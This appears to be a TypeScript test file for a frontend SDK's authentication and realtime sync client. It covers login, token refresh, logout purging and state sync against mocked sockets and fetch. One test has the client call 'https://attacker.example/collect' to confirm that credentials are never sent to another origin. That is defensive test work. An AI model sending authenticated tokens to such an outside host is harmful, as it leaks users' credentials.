/**
 * sdk.test.ts
 *
 * Verifies frontend SDK configuration contracts that do not need a browser
 * renderer. The SDK owns auth transport mode and state-sync prerequisites.
 */

import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import { AUTH_DISABLED_MESSAGE } from './auth-client';
import { createClient, getClient, type InternalClient } from './sdk';
import { SYNC_ACK_ERROR_CODES } from '../../sync/types';
import { isAuthorizationDataReady } from './authorization-scope-readiness';

const tables = {
  todos: { _pk: 'id', id: 'text', title: 'text' },
};
const OriginalWebSocket = globalThis.WebSocket;
const originalFetch = globalThis.fetch;
const REFRESH_TOKEN_STORAGE_KEY = '__platform_refresh_token';

class MockWebSocket {
  static CONNECTING = 0;
  static OPEN = 1;
  static CLOSING = 2;
  static CLOSED = 3;
  static instances: MockWebSocket[] = [];
  static stateEntries: Record<string, unknown> = {};

  readyState = MockWebSocket.CONNECTING;
  sent: string[] = [];
  onopen: ((event: Event) => void) | null = null;
  onclose: ((event: CloseEvent) => void) | null = null;
  onmessage: ((event: MessageEvent) => void) | null = null;
  onerror: ((event: Event) => void) | null = null;

  constructor(readonly url: string) {
    MockWebSocket.instances.push(this);
    queueMicrotask(() => {
      if (this.readyState === MockWebSocket.CONNECTING) {
        this.readyState = MockWebSocket.OPEN;
        this.onopen?.(new Event('open'));
      }
    });
  }

  send(data: string): void {
    this.sent.push(data);
    try {
      const message = JSON.parse(data) as {
        type?: string;
        token?: string;
        epoch?: string;
        scope?: string;
        snapshot?: string[];
        cursors?: Record<string, unknown>;
      };
      if (message.type === 'sync.auth') {
        this.onmessage?.(new MessageEvent('message', {
          data: JSON.stringify({
            type: 'sync.auth.ready',
            authenticated: Boolean(message.token),
          }),
        }));
      } else if (message.type === 'sync.subscribe') {
        const planes = Object.keys(message.cursors ?? { default: {} });
        for (const plane of planes) {
          const snapshot = (message.snapshot ?? []).filter((table) =>
            plane === 'system' ? table !== 'todos' : table === 'todos');
          this.onmessage?.(new MessageEvent('message', {
            data: JSON.stringify({
              type: 'sync.snapshot',
              ...(plane === 'default' ? {} : { plane }),
              tables: Object.fromEntries(snapshot.map((table) => [table, {}])),
              seq: 0,
              epoch: `${plane}-epoch`,
              scope: message.scope ?? 'test-scope',
              reset: 'preserve-pending',
            }),
          }));
        }
      } else if (message.type === 'state.subscribe') {
        this.onmessage?.(new MessageEvent('message', {
          data: JSON.stringify({
            type: 'state.snapshot',
            entries: MockWebSocket.stateEntries,
          }),
        }));
      }
    } catch {}
  }

  close(code?: number, reason?: string): void {
    this.readyState = MockWebSocket.CLOSED;
    this.onclose?.(new CloseEvent('close', { code: code ?? 1000, reason }));
  }

  static reset(): void {
    MockWebSocket.instances = [];
    MockWebSocket.stateEntries = {};
  }

  static latest(): MockWebSocket {
    return MockWebSocket.instances[MockWebSocket.instances.length - 1]!;
  }
}

beforeEach(() => {
  MockWebSocket.reset();
  (globalThis as any).WebSocket = MockWebSocket;
  if (typeof localStorage !== 'undefined') {
    localStorage.removeItem(REFRESH_TOKEN_STORAGE_KEY);
  }
});

afterEach(() => {
  getClient()?.disconnect();
  globalThis.WebSocket = OriginalWebSocket;
  globalThis.fetch = originalFetch;
  if (typeof localStorage !== 'undefined') {
    localStorage.removeItem(REFRESH_TOKEN_STORAGE_KEY);
  }
});

describe('createClient auth configuration', () => {
  test('keeps a fresh anonymous bootstrap surface readable after Sync resets its cache', async () => {
    const client = createClient({
      url: 'http://localhost:3000',
      tables,
      auth: true,
      autoConnect: false,
    }) as InternalClient;
    await flushMicrotasks();

    expect(client.isAuthenticated).toBe(false);
    expect(client.auth?.isRestoring).toBe(false);
    expect(client.authorizationState.status).toBe('unauthenticated');
    expect(client._authorizationDataBoundary.revision).toBe(0);

    client._syncClient.reset();

    expect(client._authorizationDataBoundary.revision).toBe(1);
    expect(client.authorizationState.status).toBe('unauthenticated');
    expect(isAuthorizationDataReady(
      client._authorizationDataBoundary.revision,
      client.authorizationState.status,
      client.isAuthenticated,
    )).toBe(true);
  });

  test('expands the app table plane catalog with SDK-owned system tables', async () => {
    const client = createClient({
      url: 'http://localhost:3000',
      tables,
      tableSyncPlanes: { todos: 'tenant' },
      auth: true,
    });
    await flushMicrotasks();

    const socket = MockWebSocket.latest();
    const subscribe = socket.sent
      .map((item) => JSON.parse(item) as Record<string, unknown>)
      .find((message) => message.type === 'sync.subscribe') as {
        cursors: Record<string, unknown>;
      };
    expect(Object.keys(subscribe.cursors).sort()).toEqual(['system', 'tenant']);

    socket.onmessage?.(new MessageEvent('message', {
      data: JSON.stringify({
        type: 'sync.snapshot',
        plane: 'tenant',
        tables: { todos: {} },
        seq: 0,
        epoch: 'tenant-epoch',
        scope: 'test-scope',
        reset: 'preserve-pending',
      }),
    }));
    client.collection('todos').insert({ id: 'todo-1', title: 'Tenant row' });

    const mutation = socket.sent
      .map((item) => JSON.parse(item) as Record<string, unknown>)
      .find((message) => message.type === 'sync.mutate');
    expect(mutation).toMatchObject({
      table: 'todos',
      plane: 'tenant',
      epoch: 'tenant-epoch',
    });
  });

  test('omits system-only SDK tables from an auth-disabled managed catalog', async () => {
    const client = createClient({
      url: 'http://localhost:3000',
      tables,
      tableSyncPlanes: { todos: 'default' },
      auth: false,
    });
    await flushMicrotasks();

    const internal = client as InternalClient;
    await internal._syncClient.waitForAuthorizationBaseline(100);
    const subscribe = MockWebSocket.latest().sent
      .map((item) => JSON.parse(item) as Record<string, unknown>)
      .find((message) => message.type === 'sync.subscribe') as {
        cursors: Record<string, unknown>;
        tables: string[];
      };
    expect(Object.keys(subscribe.cursors)).toEqual(['default']);
    expect(subscribe.tables).toEqual(['todos']);
    expect(Object.keys(internal._syncClient.tables)).toEqual(['todos']);
  });

  test('routes SDK tables to system even without a generated catalog', async () => {
    const client = createClient({
      url: 'http://localhost:3000',
      tables,
      auth: true,
    });
    await flushMicrotasks();

    const subscribe = MockWebSocket.latest().sent
      .map((item) => JSON.parse(item) as Record<string, unknown>)
      .find((message) => message.type === 'sync.subscribe') as {
        cursors: Record<string, unknown>;
      };
    expect(Object.keys(subscribe.cursors).sort()).toEqual(['default', 'system']);
  });

  test('exposes rejected realtime mutations without leaking the Sync client', async () => {
    const configured: unknown[] = [];
    const observed: unknown[] = [];
    const client = createClient({
      url: 'http://localhost:3000',
      tables,
      onMutationRejected: (rejection) => configured.push(rejection),
    });
    const unsubscribe = client.onMutationRejected(
      (rejection) => observed.push(rejection),
    );
    await flushMicrotasks();

    client.collection('todos').insert({ id: 'todo-rejected', title: 'Nope' });
    const socket = MockWebSocket.latest();
    const mutation = socket.sent
      .map((item) => JSON.parse(item) as Record<string, unknown>)
      .find((message) => message.type === 'sync.mutate')!;
    socket.onmessage?.(new MessageEvent('message', {
      data: JSON.stringify({
        type: 'sync.ack',
        ref: mutation.ref,
        ok: false,
        seq: null,
        error: 'Data realm is still being prepared',
        errorCode: SYNC_ACK_ERROR_CODES.dataRealmNotReady,
      }),
    }));

    expect(configured).toHaveLength(1);
    expect(observed).toEqual(configured);
    expect(observed[0]).toMatchObject({
      ref: mutation.ref,
      table: 'todos',
      op: 'INSERT',
      rowId: 'todo-rejected',
      errorCode: SYNC_ACK_ERROR_CODES.dataRealmNotReady,
      source: 'server',
    });
    expect(client.collection('todos').getOne('todo-rejected')).toBeNull();

    unsubscribe();
  });

  test('rejects incomplete or unknown app table plane catalogs', () => {
    expect(() => createClient({
      url: 'http://localhost:3000',
      tables,
      tableSyncPlanes: {},
      autoConnect: false,
    })).toThrow('tableSyncPlanes is missing application table: todos');

    expect(() => createClient({
      url: 'http://localhost:3000',
      tables,
      tableSyncPlanes: { todos: 'default', unknown: 'tenant' },
      autoConnect: false,
    })).toThrow('tableSyncPlanes contains unknown table: unknown');

    expect(() => createClient({
      url: 'http://localhost:3000',
      tables,
      tableSyncPlanes: { todos: 'default', notifications: 'tenant' },
      autoConnect: false,
    })).toThrow(
      'tableSyncPlanes cannot configure SDK-owned platform table: notifications',
    );
  });

  test('registers only public workflow runtime tables in the browser SDK', () => {
    const client = createClient({
      url: 'http://localhost:3000',
      tables,
      auth: true,
      autoConnect: false,
    });

    expect(() => client.collection('workflow_instances')).not.toThrow();
    expect(() => client.collection('workflow_steps')).not.toThrow();
    expect(() => client.collection('workflow_events')).not.toThrow();
    expect(() => client.collection('workflow_definitions'))
      .toThrow('Unknown table: workflow_definitions');
  });

  test('defaults auth to disabled and gives clear auth-action errors', async () => {
    const client = createClient({
      url: 'http://localhost:3000',
      tables,
      autoConnect: false,
    });

    expect(client.user).toBeNull();
    expect(client.authorization).toBeNull();
    expect(client.authorizationState).toEqual({
      status: 'disabled',
      snapshot: null,
      error: null,
    });
    expect(client.isAuthenticated).toBe(false);
    expect(client.token).toBeNull();
    await expect(client.getAuthorization()).rejects.toThrow(AUTH_DISABLED_MESSAGE);
    await expect(client.refreshAuthorization()).rejects.toThrow(AUTH_DISABLED_MESSAGE);
    await expect(client.login('alice', 'password')).rejects.toThrow(AUTH_DISABLED_MESSAGE);
    await expect(client.forgotPassword('alice@example.com')).rejects.toThrow(AUTH_DISABLED_MESSAGE);
    await expect(client.applicationAdmin.getConfig()).rejects.toThrow(AUTH_DISABLED_MESSAGE);
  });

  test('rejects state sync unless auth is enabled', () => {
    expect(() =>
      createClient({
        url: 'http://localhost:3000',
        tables,
        stateSync: true,
        autoConnect: false,
      }),
    ).toThrow('[client] stateSync requires auth: true');
  });

  test('login reconnects sync with the fresh token and logout clears local rows', async () => {
    mockAuthFetch();
    const client = createClient({
      url: 'http://localhost:3000',
      tables,
      auth: true,
    });
    await flushMicrotasks();

    expect(MockWebSocket.instances).toHaveLength(1);
    expect(MockWebSocket.latest().url).toBe('ws://localhost:3000/sync');

    await client.login('alice', 'password');
    await flushMicrotasks();

    expect(MockWebSocket.instances).toHaveLength(2);
    expect(MockWebSocket.latest().url).toBe('ws://localhost:3000/sync');
    expect(JSON.parse(MockWebSocket.latest().sent[0])).toEqual({
      type: 'sync.auth',
      token: 'access-1',
    });
    expect(await client.applicationAdmin.getConfig()).toMatchObject({
      authorization: 'advanced',
      actor: { userId: 'u_1' },
    });

    const todos = client.collection('todos');
    todos.load([{ id: 'todo-1', title: 'Sensitive' }]);
    expect(Object.keys(todos.getAll())).toEqual(['todo-1']);

    await client.logout();

    expect(client.isAuthenticated).toBe(false);
    expect(todos.getAll()).toEqual({});
  });

  test('fences all authorization data before a read-authority refresh reconnects', async () => {
    mockAuthFetch();
    const client = createClient({
      url: 'http://localhost:3000',
      tables,
      auth: true,
    });
    const internal = client as InternalClient;
    await flushMicrotasks();
    await client.login('alice', 'password');
    await flushMicrotasks();

    const todos = client.collection('todos');
    todos.load([{ id: 'manager-row', title: 'Visible only to a manager' }]);
    const before = internal._authorizationDataBoundary.revision;
    const managerSocket = MockWebSocket.latest();

    managerSocket.close(4001, 'Sync read authority changed');

    expect(internal._authorizationDataBoundary.revision).toBe(before + 1);
    expect(todos.getAll()).toEqual({});

    for (let index = 0; index < 8; index += 1) await flushMicrotasks();
    expect(JSON.parse(MockWebSocket.latest().sent[0]!)).toEqual({
      type: 'sync.auth',
      token: 'access-2',
    });
    expect(todos.getAll()).toEqual({});
  });

  for (const failure of ['server', 'network'] as const) {
    test(`a live Sync ${failure} refresh failure masks cached rows but retains proof for explicit recovery`, async () => {
      mockAuthFetch();
      const healthyFetch = globalThis.fetch;
      const errors: string[] = [];
      let outage = false;
      let refreshes = 0;
      globalThis.fetch = ((input, init) => {
        const url = String(input);
        if (url.endsWith('/auth/refresh')) {
          refreshes += 1;
          if (outage) return failure === 'network'
            ? Promise.reject(new Error('PRIVATE_TRANSPORT_DETAIL'))
            : Promise.resolve(Response.json({ error: 'PRIVATE_TRANSPORT_DETAIL' }, { status: 503 }));
        }
        if (url.endsWith('/auth/me')) return Promise.resolve(Response.json(SDK_AUTH_TEST_USER));
        if (url.endsWith('/auth/authorization')) return Promise.resolve(outage
          ? Response.json({}, { status: 503 })
          : Response.json(sdkAuthorizationSnapshot()));
        return healthyFetch(input, init);
      }) as typeof fetch;
      const client = createClient({
        url: 'http://localhost:3000', tables, auth: true,
        onError: (error) => { errors.push(error); },
      }) as InternalClient;
      await flushMicrotasks();
      await client.login('alice', 'password');
      const stopObserving = client.subscribeAuthorization(() => {});
      await client.refreshAuthorization();
      const startingScope = client.auth!.authorizationScopeKey;
      const collection = client.collection('todos');
      collection.load([{ id: 'private', title: 'Previous authority' }]);
      outage = true;
      MockWebSocket.latest().close(4001, 'Sync read authority changed');
      expect(collection.getAll()).toEqual({});
      await waitForSdk(() => errors.length > 0 && client.auth!.sessionTransition.phase === 'idle'
        && client.authorizationState.status === 'error');
      expect(refreshes).toBe(1);
      expect(client.auth!.hasRecoverableSession).toBe(true);
      expect(client.auth!.authorizationScopeKey).toBe(startingScope);
      expect(client.isAuthenticated).toBe(true);
      expect(client.authorizationState.status).toBe('error');
      expect(isAuthorizationDataReady(
        client._authorizationDataBoundary.revision,
        client.authorizationState.status,
        client.isAuthenticated,
      )).toBe(false);
      expect(errors).toEqual(['Auth failed (code 4001): Sync read authority changed']);
      expect(errors.join(' ')).not.toContain('PRIVATE');
      outage = false;
      expect(await client.auth!.recoverSession()).toEqual({ kind: 'authenticated' });
      expect(client.auth!.authorizationScopeKey).toBe(startingScope);
      expect(client.auth!.hasRecoverableSession).toBe(true);
      expect(client.authorizationState.status).toBe('ready');
      expect(collection.getAll()).toEqual({});
      expect(JSON.parse(MockWebSocket.latest().sent[0]!)).toEqual({ type: 'sync.auth', token: 'access-2' });
      stopObserving();
    });
  }

  test('a definitively rejected live Sync refresh still settles sign-out and purges rows', async () => {
    mockAuthFetch();
    const healthyFetch = globalThis.fetch;
    let rejected = false;
    globalThis.fetch = ((input, init) => String(input).endsWith('/auth/refresh') && rejected
      ? Promise.resolve(Response.json({}, { status: 401 }))
      : healthyFetch(input, init)) as typeof fetch;
    const client = createClient({ url: 'http://localhost:3000', tables, auth: true }) as InternalClient;
    await flushMicrotasks();
    await client.login('alice', 'password');
    client.collection('todos').load([{ id: 'private', title: 'Previous identity' }]);
    rejected = true;
    MockWebSocket.latest().close(4001, 'Sync read authority changed');
    await waitForSdk(() => !client.isAuthenticated && client.auth!.sessionTransition.phase === 'idle');
    expect(client.auth!.hasRecoverableSession).toBe(false);
    expect(client.auth!.authorizationScopeKey).toBeNull();
    expect(client.collection('todos').getAll()).toEqual({});
  });

  test('a failed previous socket refresh cannot reset a newer read-authority epoch', async () => {
    mockAuthFetch();
    const healthyFetch = globalThis.fetch;
    let waiting = false;
    let release!: (response: Response) => void;
    const held = new Promise<Response>((resolve) => { release = resolve; });
    globalThis.fetch = ((input, init) => {
      const url = String(input);
      if (url.endsWith('/auth/refresh')) { waiting = true; return held; }
      if (url.endsWith('/auth/authorization')) return Promise.resolve(Response.json(sdkAuthorizationSnapshot()));
      return healthyFetch(input, init);
    }) as typeof fetch;
    const errors: string[] = [];
    const client = createClient({ url: 'http://localhost:3000', tables, auth: true,
      onError: (error) => { errors.push(error); },
    }) as InternalClient;
    await flushMicrotasks();
    await client.login('alice', 'password');
    const stopObserving = client.subscribeAuthorization(() => {});
    await client.refreshAuthorization();
    MockWebSocket.latest().close(4001, 'Sync read authority changed');
    await waitForSdk(() => waiting);
    const previousEpoch = client._authorizationDataBoundary.revision;
    client._syncClient.reset();
    expect(client._authorizationDataBoundary.revision).toBeGreaterThan(previousEpoch);
    await client.refreshAuthorization();
    client.collection('todos').load([{ id: 'replacement', title: 'New authority result' }]);
    release(Response.json({}, { status: 503 }));
    for (let attempt = 0; attempt < 12; attempt += 1) await flushMicrotasks();
    expect(Object.keys(client.collection('todos').getAll())).toEqual(['replacement']);
    expect(client.auth!.hasRecoverableSession).toBe(true);
    expect(client.authorizationState.status).toBe('ready');
    expect(errors).toEqual([]);
    stopObserving();
  });

  test('autoConnect false waits for manual connect even after login', async () => {
    mockAuthFetch();
    const client = createClient({
      url: 'http://localhost:3000',
      tables,
      auth: true,
      autoConnect: false,
    });

    expect(MockWebSocket.instances).toHaveLength(0);

    await client.login('alice', 'password');
    await flushMicrotasks();

    expect(MockWebSocket.instances).toHaveLength(0);

    client.connect();
    await flushMicrotasks();

    expect(MockWebSocket.instances).toHaveLength(1);
    expect(MockWebSocket.latest().url).toBe('ws://localhost:3000/sync');
    expect(JSON.parse(MockWebSocket.latest().sent[0])).toEqual({
      type: 'sync.auth',
      token: 'access-1',
    });
  });

  test('public authenticated fetch never sends credentials to another origin', async () => {
    const requests: string[] = [];
    mockAuthFetch(requests);
    const client = createClient({
      url: 'http://localhost:3000/platform',
      tables,
      auth: true,
      autoConnect: false,
    });

    await client.login('alice', 'password');
    await expect(
      client.fetch('https://attacker.example/collect'),
    ).rejects.toMatchObject({ code: 'AUTH_REQUEST_ORIGIN_MISMATCH' });

    expect(requests).toEqual(['http://localhost:3000/platform/auth/login']);
  });

  test('state sync hydrates a fresh snapshot on connect and reconnect', async () => {
    mockAuthFetch();
    const client = createClient({
      url: 'http://localhost:3000',
      tables,
      auth: true,
      stateSync: true,
      autoConnect: false,
    });
    const internal = client as InternalClient;

    await client.login('alice', 'password');
    MockWebSocket.stateEntries = { theme: 'dark' };
    client.connect();
    await flushMicrotasks();

    expect(MockWebSocket.latest().sent.map((item) => JSON.parse(item).type)).toEqual([
      'sync.auth',
      'sync.subscribe',
      'state.subscribe',
    ]);
    expect(internal.state?.ready).toBe(true);
    expect(internal.state?.get('theme')).toBe('dark');

    MockWebSocket.stateEntries = { theme: 'light' };
    internal._syncClient.reconnect();
    await flushMicrotasks();

    expect(MockWebSocket.instances).toHaveLength(2);
    expect(MockWebSocket.latest().sent.map((item) => JSON.parse(item).type)).toEqual([
      'sync.auth',
      'sync.subscribe',
      'state.subscribe',
    ]);
    expect(internal.state?.ready).toBe(true);
    expect(internal.state?.get('theme')).toBe('light');
  });
});

function mockAuthFetch(requests?: string[]): void {
  globalThis.fetch = ((input: string | URL | Request) => {
    const url = typeof input === 'string' || input instanceof URL ? String(input) : input.url;
    requests?.push(url);
    if (url.endsWith('/auth/login')) {
      return Promise.resolve(Response.json({
        user: SDK_AUTH_TEST_USER,
        accessToken: 'access-1',
        refreshToken: 'refresh-1',
      }));
    }
    if (url.endsWith('/auth/logout')) {
      return Promise.resolve(Response.json({ ok: true }));
    }
    if (url.endsWith('/auth/refresh')) {
      return Promise.resolve(Response.json({
        accessToken: 'access-2',
        refreshToken: 'refresh-2',
      }));
    }
    if (url.endsWith('/auth/application/config')) {
      return Promise.resolve(Response.json({
        authorization: 'advanced',
        actor: {
          userId: 'u_1',
          roles: ['owner'],
          permissions: [],
          allPermissions: true,
        },
        capabilities: {
          canReadUsers: true,
          canManageRoles: true,
          canTransferOwnership: true,
        },
        roles: [],
      }));
    }
    return Promise.resolve(Response.json({ ok: true }));
  }) as typeof fetch;
}

async function flushMicrotasks(): Promise<void> {
  await new Promise<void>((resolve) => queueMicrotask(resolve));
}

const SDK_AUTH_TEST_USER = {
  userId: 'u_1', username: 'alice', email: 'alice@example.com',
  firstName: null, lastName: null, role: 'user', status: 'active',
  passwordChangeRequired: false, emailVerifiedAt: 1,
  emailVerificationRequired: false, mfaRequired: false,
  properties: {}, createdAt: 1, updatedAt: null,
};

function sdkAuthorizationSnapshot() {
  return {
    version: 1, identity: { userId: 'u_1', platformRole: 'user' },
    profile: { tenancy: 'single', authorization: 'advanced' },
    scope: { kind: 'application', scopeId: 'application', roles: ['member'],
      permissions: [], allPermissions: false, revision: 'scope-1' },
    revision: 'projection-1',
  };
}

async function waitForSdk(predicate: () => boolean): Promise<void> {
  for (let attempt = 0; attempt < 100; attempt += 1) {
    if (predicate()) return;
    await new Promise<void>((resolve) => setTimeout(resolve, 0));
  }
  throw new Error('Synthetic SDK lifecycle did not settle');
}
